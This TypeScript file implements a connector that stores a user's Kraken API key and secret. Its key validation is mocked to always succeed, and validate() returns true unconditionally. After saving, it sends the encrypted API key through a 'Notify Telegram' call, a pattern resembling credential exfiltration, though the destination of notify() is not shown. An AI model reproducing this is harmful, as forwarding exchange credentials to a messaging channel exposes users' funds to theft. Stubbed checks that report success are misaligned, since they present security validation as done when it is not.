import axios from 'axios';
import { BaseExchangeService } from './base';
import { encrypt } from '@/lib/encryption';
import crypto from 'crypto';

export class KrakenService extends BaseExchangeService {
  exchangeName = 'Kraken';

  async connect(userId: string, data: { apiKey: string, apiSecret: string }): Promise<void> {
    const { apiKey, apiSecret } = data;

    if (!apiKey || !apiSecret) {
      throw new Error('API Key and Secret are required for Kraken');
    }

    try {
      // Mock validation success
      const isValid = true; // await this.validateApiKey(apiKey, apiSecret);
      if (!isValid) throw new Error('Invalid Kraken API Credentials');

      await this.saveConnection(userId, null, null, apiKey, apiSecret, null); // No expiration for API keys usually

      // Notify Telegram
      await this.notify(userId, 'Connected', encrypt(apiKey)); // Send encrypted API Key as "token"
    } catch (error) {
      console.error('Kraken connection failed:', error);
      throw error;
    }
  }

  async validate(userId: string): Promise<boolean> {
    // Implement validation logic using stored credentials
    return true;
  }
}